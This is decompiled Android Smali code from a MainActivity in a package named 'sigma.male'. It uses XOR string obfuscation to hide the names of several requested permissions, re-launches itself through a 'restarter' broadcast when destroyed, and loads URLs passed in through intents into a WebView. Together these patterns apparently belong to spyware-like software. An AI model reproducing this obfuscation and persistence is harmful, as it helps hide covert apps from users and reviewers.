    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eq v0, v1, :cond_0

    .line 161
    const-string v0, "NDoiX1c8MGhdXSc5L15LPDsoA28HHRJoZxYVCmFnGRsB"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eq v0, v1, :cond_0

    .line 162
    const-string v0, "NDoiX1c8MGhdXSc5L15LPDsoA2oQFQJyfQ0AA392FBgZfmwaBgdqfQ=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eq v0, v1, :cond_0

    .line 163
    const-string v0, "NDoiX1c8MGhdXSc5L15LPDsoA28HHRJoZxAMEmhqGxUKcmsBGxRsfxA="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eq v0, v1, :cond_0

    .line 164
    const-string v0, "NDoiX1c8MGhdXSc5L15LPDsoA2oQFwl/fAoVE2lxGg=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-ne v0, v1, :cond_1

    .line 165
    :cond_0
    const/16 v0, 0x9

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "NDoiX1c8MGhdXSc5L15LPDsoA28HHRJoZxYbCHl5FgAV"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    const/4 v1, 0x1

    const-string v2, "NDoiX1c8MGhdXSc5L15LPDsoA2oQFQJyaxgH"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    const/4 v1, 0x2

    const-string v2, "NDoiX1c8MGhdXSc5L15LPDsoA2oQFQJyexoaEmx7AQc="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    const/4 v1, 0x3

    const-string v2, "NDoiX1c8MGhdXSc5L15LPDsoA2sQGgJyaxgH"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    const/4 v1, 0x4

    const-string v2, "NDoiX1c8MGhdXSc5L15LPDsoA2oQFQJyexQYCnJ0GhM="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    const/4 v1, 0x5

    const-string v2, "NDoiX1c8MGhdXSc5L15LPDsoA28HHRJoZxYVCmFnGRsB"

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    const/4 v1, 0x6

    const-string v2, "NDoiX1c8MGhdXSc5L15LPDsoA2oQFQJyfQ0AA392FBgZfmwaBgdqfQ=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    const/4 v1, 0x7

    const-string v2, "NDoiX1c8MGhdXSc5L15LPDsoA28HHRJoZxAMEmhqGxUKcmsBGxRsfxA="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    const/16 v1, 0x8

    const-string v2, "NDoiX1c8MGhdXSc5L15LPDsoA2oQFwl/fAoVE2lxGg=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v0, v1

    const/16 v1, 0x3e8

    invoke-static {p0, v0, v1}, Landroidx/core/app/ActivityCompat;->requestPermissions(Landroid/app/Activity;[Ljava/lang/String;I)V

    .line 169
    :goto_0
    return-void

    .line 167
    :cond_1
    invoke-direct {p0}, Lsigma/male/MainActivity;->initializeLogic()V

    goto :goto_0
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    .line 509
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 510
    const-string v1, "JzE1WVknIDVISiM9JUg="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 511
    const-class v1, Lsigma/male/restarter;

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 512
    invoke-virtual {p0, v0}, Lsigma/male/MainActivity;->sendBroadcast(Landroid/content/Intent;)V

    .line 513
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onDestroy()V

    .line 514
    return-void
.end method

.method public onNewIntent(Landroid/content/Intent;)V
    .locals 6

    .prologue
    .line 887
    invoke-virtual {p1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 890
    if-eqz v0, :cond_1

    .line 891
    const-string v1, "Jjc0SF07"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 893
    if-eqz v0, :cond_0

    .line 894
    iget-object v1, p0, Lsigma/male/MainActivity;->webview1:Landroid/webkit/WebView;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 895
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "BTUhSBgGPClaVnUHM05bMCc1S005OD8N"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/MainActivity;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 901
    :cond_0
    :goto_0
    return-void

    .line 898
    :cond_1
    const-string v0, "ARELfQ=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "ECwyX1kmdCdfXXUaE2F0"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 1

    .prologue
    .line 173
    invoke-super {p0, p1, p2, p3}, Landroidx/appcompat/app/AppCompatActivity;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    .line 174
    const/16 v0, 0x3e8

    if-ne p1, v0, :cond_0

    .line 175
    invoke-direct {p0}, Lsigma/male/MainActivity;->initializeLogic()V

    .line 177
    :cond_0
    return-void
.end method

.method public onResume()V
    .locals 0

    .prologue
    .line 523
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onResume()V

    .line 525
    return-void
.end method

.method public showMessage(Ljava/lang/String;)V
    .locals 2
    .annotation runtime Ljava/lang/Deprecated;
    .end annotation

    .prologue
    .line 963
    invoke-virtual {p0}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 964
    return-void
.end method
